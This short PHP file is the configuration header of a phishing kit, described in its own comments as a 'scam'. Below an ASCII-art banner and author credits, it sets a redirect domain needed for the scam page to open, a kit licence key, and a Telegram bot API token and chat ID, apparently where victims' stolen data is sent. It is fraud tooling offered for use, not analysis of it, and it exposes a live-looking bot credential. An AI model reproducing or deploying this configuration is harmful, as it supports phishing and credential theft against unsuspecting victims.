<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
*/
	/*
	# -> All Created By MarkOS
	# -> ICQ : 740936101
	# -> // : Instructions
	*/
	// ================================= //
	// ================================= //
	$redirectlink = "l34kc0de.today";	 	 // You must use redirect or the scam will not open
	// ================================= //
	// ================================= //
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	$API_KEY = "FUCKED_BY_MARK_OS";
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	// ================================= //
	// ================================= //
    $api = "5581850218:AAGMCVg8Uqi4MmUtJAlDEhujBcTYCTzcf2c"; //bot api
    $chatid ="-665149029"; //chatID 